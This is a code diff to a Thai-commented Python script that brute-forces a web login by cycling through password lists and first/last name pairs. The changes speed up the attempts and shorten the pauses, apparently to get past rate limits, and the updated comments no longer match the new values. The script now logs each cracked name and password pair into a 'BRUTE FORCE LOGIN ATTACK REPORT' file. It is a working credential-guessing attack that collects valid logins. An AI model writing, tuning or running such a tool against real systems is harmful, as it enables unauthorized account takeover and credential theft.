@@ -4,6 +4,7 @@ from dotenv import load_dotenv
 import os
 import time
 import random
+from datetime import datetime
 
 # 1. โหลด environment variables
 load_dotenv()
@@ -95,11 +96,13 @@ print("-" * 50)
 # 7. วนลูปทดสอบข้อมูลจากไฟล์
 attempt_count = 0
 success_count = 0
+successful_logins = []  # เก็บข้อมูลที่ login สำเร็จ
+start_time = datetime.now()  # บันทึกเวลาเริ่มต้น
 
 # ตั้งค่าการหน่วงเวลา
-MIN_DELAY = 1.0  # หน่วงขั้นต่ำ 1 วินาที
-MAX_DELAY = 3.0  # หน่วงสูงสุด 3 วินาที
-BATCH_SIZE = 5   # ทดสอบ 5 ครั้งแล้วหยุดพักนาน
+MIN_DELAY = 0.5  # หน่วงขั้นต่ำ 1 วินาที
+MAX_DELAY = 2.0  # หน่วงสูงสุด 3 วินาที
+BATCH_SIZE = 15   # ทดสอบ 5 ครั้งแล้วหยุดพักนาน
 BATCH_DELAY = 5.0  # หยุดพัก 5 วินาทีหลังทดสอบ 5 ครั้ง
 
 # เริ่มที่ password ก่อน (outer loop)
@@ -139,6 +142,13 @@ for password in passwords:
             if post_response.text.strip().lower() == "true":
                 print("✅ Login สำเร็จ (ระบบตอบ true)")
                 success_count += 1
+                successful_logins.append({
+                    'attempt': attempt_count,
+                    'fname': fname,
+                    'lname': lname,
+                    'password': password,
+                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                })
             else:
                 print("❌ Login ล้มเหลว (ระบบตอบ false)")
             
@@ -150,10 +160,97 @@ for password in passwords:
             print("-" * 30)
 
 # 8. สรุปผลลัพธ์
+end_time = datetime.now()
+duration = end_time - start_time
+
 print("\n" + "=" * 50)
 print("📈 สรุปผลการทดสอบ:")
 print(f"   - จำนวนครั้งที่ทดสอบ: {attempt_count}")
 print(f"   - จำนวนครั้งที่สำเร็จ: {success_count}")
 print(f"   - จำนวนครั้งที่ล้มเหลว: {attempt_count - success_count}")
+print(f"   - เวลาเริ่มต้น: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
+print(f"   - เวลาสิ้นสุด: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
+print(f"   - ระยะเวลาที่ใช้: {duration}")
 print("=" * 50)
 print("🎯 การทดสอบเสร็จสิ้น!")
+
+# 9. บันทึกผลลัพธ์ลงไฟล์ result.txt ในรูปแบบ log 
+def save_results_to_log():
+    """บันทึกผลลัพธ์ลงไฟล์ result.txt ในรูปแบบ log"""
+    
+    # สร้างเนื้อหา log
+    log_content = f"""
+================================================================================
+BRUTE FORCE LOGIN ATTACK REPORT
+================================================================================
+
+EXECUTION DETAILS:
+    Target URL: {base_url}
+    Start Time: {start_time.strftime('%Y-%m-%d %H:%M:%S')}
+    End Time: {end_time.strftime('%Y-%m-%d %H:%M:%S')}
+    Duration: {duration}
+    Total Attempts: {attempt_count}
+    Successful Logins: {success_count}
+    Failed Attempts: {attempt_count - success_count}
+    Success Rate: {(success_count/attempt_count*100):.2f}%
+
+ATTACK PARAMETERS:
+    FName Records: {len(fnames)}
+    LName Records: {len(lnames)}
+    Password Records: {len(passwords)}
+    Test Combinations: {len([f + l for f, l in zip(fnames, lnames)]) * len(passwords)}
+    Delay Range: {MIN_DELAY}-{MAX_DELAY} seconds
+    Batch Size: {BATCH_SIZE}
+    Batch Delay: {BATCH_DELAY} seconds
+
+SUCCESSFUL LOGINS:
+"""
+    
+    if successful_logins:
+        log_content += """    +----+----------------+----------------------+------------+---------------------+
+    | ID | First Name     | Last Name            | Password   | Timestamp           |
+    +----+----------------+----------------------+------------+---------------------+
+"""
+        for i, login in enumerate(successful_logins, 1):
+            fname_padded = f"{login['fname']:<14}"
+            lname_padded = f"{login['lname']:<20}"
+            password_padded = f"{login['password']:<10}"
+            log_content += f"    | {i:2d} | {fname_padded} | {lname_padded} | {password_padded} | {login['timestamp']} |\n"
+        log_content += "    +----+----------------+----------------------+------------+---------------------+\n"
+    else:
+        log_content += "    NO SUCCESSFUL LOGINS FOUND\n"
+    
+    log_content += f"""
+ATTACK STATISTICS:
+    +------------------------+----------+
+    | Metric                 | Value    |
+    +------------------------+----------+
+    | Total Attempts         | {attempt_count:8d} |
+    | Successful Logins      | {success_count:8d} |
+    | Failed Attempts        | {attempt_count - success_count:8d} |
+    | Success Rate           | {(success_count/attempt_count*100):7.2f}% |
+    | Average Time per Test  | {(duration.total_seconds()/attempt_count):7.2f}s |
+    +------------------------+----------+
+
+SECURITY ASSESSMENT:
+    Risk Level: {'HIGH' if success_count > 0 else 'LOW'}
+    Vulnerable Accounts: {success_count}
+    Attack Effectiveness: {(success_count/attempt_count*100):.2f}%
+    Recommendations: {'Immediate password policy review required' if success_count > 0 else 'Current security measures appear effective'}
+
+================================================================================
+REPORT GENERATED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+================================================================================
+
+"""
+    
+    # บันทึกลงไฟล์ (append mode)
+    try:
+        with open('result.txt', 'a', encoding='utf-8') as f:
+            f.write(log_content)
+        print("💾 บันทึกผลลัพธ์ลงไฟล์ result.txt แล้ว")
+    except Exception as e:
+        print(f"❌ ไม่สามารถบันทึกผลลัพธ์ได้: {e}")
+
+# เรียกใช้ฟังก์ชันบันทึกผลลัพธ์
+save_results_to_log()
